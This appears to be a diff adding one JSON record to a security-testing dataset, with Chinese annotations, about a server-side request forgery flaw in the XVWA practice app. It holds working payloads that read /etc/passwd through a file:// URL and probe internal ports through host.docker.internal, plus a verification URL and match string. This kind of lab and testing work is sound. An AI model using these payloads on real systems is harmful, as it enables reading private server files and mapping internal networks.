@@ -1,0 +1,15 @@
+[
+  {
+    "id": "auto-20261030181809",
+    "context": "XVWA SSRF/XSPA: home.php 中 file_get_contents($_POST['img_url']) 直接抓取用户任意URL，无过滤；内容写入 ./images/xxx_img1.jpg 后以 <img src> 回显。可 file:// 读本地文件、http:// 探内网端口(XSPA)。",
+    "reference_payload": "POST img_url=file:///etc/passwd （回显完整passwd）; POST img_url=http://host.docker.internal:8082/ （回显内网Juice Shop首页9984字节作端口开放对照）",
+    "principle": "file_get_contents 无URL协议/内网过滤 → SSRF 读本地文件 + 内网端口探测(XSPA)；回显靠写入images目录后再读回",
+    "source": "xvwa",
+    "verify_url": "http://localhost:8084/xvwa/vulnerabilities/ssrf_xspa/",
+    "evidence": {
+      "verify": "echo",
+      "url": "http://localhost:8084/xvwa/vulnerabilities/ssrf_xspa/ (POST img_url=file:///etc/passwd)",
+      "match": "root:x:0:0:root"
+    }
+  }
+]
